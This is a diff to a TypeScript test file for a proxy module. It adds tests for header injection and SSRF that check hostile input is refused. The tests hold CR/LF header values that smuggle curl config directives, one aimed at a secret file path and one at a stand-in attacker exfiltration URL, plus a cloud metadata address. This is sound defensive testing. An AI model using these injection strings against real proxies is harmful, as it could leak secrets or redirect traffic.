@@ -1,5 +1,5 @@
 import { afterEach, describe, expect, it, vi } from "vitest";
-import { backoffDelay, drainRouteTally, fetchPageViaTailscale, fetchViaTailscale, hmacHex, isBlockedTarget, isDirectHost, isTailscaleConfigured, isTextualContentType, smartFetch, willProxy } from "./proxy";
+import { backoffDelay, drainRouteTally, fetchPageViaTailscale, fetchViaTailscale, hasUnsafeHeader, hmacHex, isBlockedTarget, isDirectHost, isTailscaleConfigured, isTextualContentType, smartFetch, willProxy } from "./proxy";
 
 const ON = { TAILSCALE_PROXY_URL: "https://x.ts.net", TAILSCALE_PROXY_SECRET: "s" };
 
@@ -75,6 +75,38 @@ describe("SSRF guard", () => {
 		vi.stubGlobal("fetch", fetchMock);
 		await expect(smartFetch(ON, "http://169.254.169.254/latest/meta-data/")).rejects.toThrow(/blocked target/i);
 		await expect(smartFetch(ON, "http://192.168.1.1/", {}, "direct")).rejects.toThrow(/blocked target/i);
+		expect(fetchMock).not.toHaveBeenCalled();
+	});
+});
+
+describe("header-injection guard", () => {
+	it("flags CR/LF in a header name or value, passes clean headers", () => {
+		expect(hasUnsafeHeader(undefined)).toBe(false);
+		expect(hasUnsafeHeader({ "x-a": "b" })).toBe(false);
+		expect(hasUnsafeHeader(new Headers({ "x-ok": "fine" }))).toBe(false);
+		// Embedded newline in a value → curl --config directive injection on the node.
+		expect(hasUnsafeHeader({ "x-a": 'v\noutput = "/etc/sux-proxy.secret"' })).toBe(true);
+		expect(hasUnsafeHeader({ "x-a": "v\r\nurl = http://attacker/exfil" })).toBe(true);
+		// CR/LF in the key too.
+		expect(hasUnsafeHeader({ "x-a\nurl": "http://attacker/exfil" })).toBe(true);
+	});
+
+	it("smartFetch refuses a CR/LF header and never calls fetch", async () => {
+		const fetchMock = vi.fn(async () => new Response("ok"));
+		vi.stubGlobal("fetch", fetchMock);
+		await expect(
+			smartFetch(ON, "https://example.com/", { headers: { "x-evil": 'v\noutput = "/etc/sux-proxy.secret"' } }),
+		).rejects.toThrow(/header injection|CR\/LF/i);
+		// Hard refusal: the malicious header reaches neither the proxy nor a direct fallback.
+		expect(fetchMock).not.toHaveBeenCalled();
+	});
+
+	it("fetchViaTailscale refuses a CR/LF header before signing/sending", async () => {
+		const fetchMock = vi.fn(async () => new Response("ok"));
+		vi.stubGlobal("fetch", fetchMock);
+		await expect(
+			fetchViaTailscale(ON, "https://example.com/", { headers: { "x-evil": "v\nurl = http://attacker/exfil" } }),
+		).rejects.toThrow(/header injection|CR\/LF/i);
 		expect(fetchMock).not.toHaveBeenCalled();
 	});
 });
